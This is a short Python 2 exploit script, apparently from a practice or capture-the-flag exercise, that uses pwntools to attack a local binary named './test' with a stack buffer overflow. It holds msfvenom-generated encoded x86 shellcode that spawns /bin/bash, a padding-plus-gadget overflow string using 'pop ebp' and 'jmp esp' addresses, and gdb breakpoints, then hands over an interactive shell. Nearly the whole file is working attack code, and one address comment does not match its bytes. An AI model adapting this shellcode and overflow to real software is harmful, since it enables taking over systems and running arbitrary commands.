import pwnlib

""" msfvenom --payload linux/x86/exec CMD='/bin/bash' --format python --bad-chars "\x00\x0a\x0d\x0c\x20"
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with An encoding exception occurred.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 72 (iteration=0)
x86/call4_dword_xor chosen with final size 72
Payload size: 72 bytes"""
buf =  ""
buf += "\x31\xc9\x83\xe9\xf4\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x27\x42\xa0\xbb\x83\xee\xfc\xe2\xf4\x4d\x49"
buf += "\xf8\x22\x75\x24\xc8\x96\x44\xcb\x47\xd3\x08\x31\xc8"
buf += "\xbb\x4f\x6d\xc2\xd2\x49\xcb\x43\xe9\xcf\x48\xa0\xbb"
buf += "\x27\x6d\xc2\xd2\x49\x6d\xc2\xda\x54\x2a\xa0\xec\x74"
buf += "\xcb\x41\x76\xa7\x42\xa0\xbb"

pop_ebp = "\xa5\x84\x04\x08" #0x0804844e
jmp_esp = "\xa2\x84\x04\x08"
overflow = "A"*58 + pop_ebp + jmp_esp + "A"*10 + buf


p = pwnlib.tubes.process.process("./test")

# ROPgadget --binary test
pwnlib.gdb.attach(p, """
	b main
	b *0x080484e5
	b *0x0804851a""")

print p.recv()
p.sendline(overflow)
p.interactive()